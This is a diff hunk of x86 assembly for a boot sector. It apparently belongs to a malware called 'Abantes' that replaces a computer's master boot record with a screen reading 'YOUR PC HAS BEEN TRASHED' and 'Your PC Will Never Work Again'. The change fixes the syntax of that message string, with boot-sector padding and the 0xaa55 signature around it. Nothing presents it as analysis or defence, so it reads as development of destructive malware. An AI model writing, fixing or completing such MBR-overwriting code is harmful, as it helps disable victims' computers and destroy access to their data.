@@ -40,6 +40,6 @@ clear_screen:
         int 0x10
         ret
    
-msg:            db        "YOUR PC HAS BEEN TRASHED BY ABANTES",13,10," ",13,10,"This PC Is Dead Because You Didn't Follow The Rules",13,10,"You're PC Will Never Work Again",13,10" ",13,10" ",13,10" ",13,10"NOTE:",13,10"Even If You Fix The MBR Your PC Is Still Infected", 0
+msg:            db        "YOUR PC HAS BEEN TRASHED BY ABANTES",13,10," ",13,10,"This PC Is Dead Because You Didn't Follow The Rules",13,10,"You're PC Will Never Work Again",13,10," ",13,10," ",13,10," ",13,10"NOTE:",13,10,"Even If You Fix The MBR Your PC Is Still Infected", 0
 times 510 - ($-$$) db 0
 dw        0xaa55
